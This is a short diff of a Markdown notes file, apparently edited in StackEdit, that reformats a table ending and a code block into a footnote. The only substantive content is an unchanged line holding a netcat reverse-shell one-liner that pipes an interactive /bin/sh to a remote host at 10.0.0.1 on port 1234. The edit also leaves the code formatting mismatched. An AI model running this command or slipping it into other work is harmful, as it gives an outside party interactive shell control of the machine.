@@ -33,11 +33,10 @@
   </tr>
 </table>
 
-[
-```
+[^1]: `
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjE4OTAxNjg0LC0xNzIyNDUwNDAzLC0xOT
-Y2NTg4NTE1XX0=
+eyJoaXN0b3J5IjpbMTMxNDY3MjcyNCwyMTg5MDE2ODQsLTE3Mj
+I0NTA0MDMsLTE5NjY1ODg1MTVdfQ==
 -->
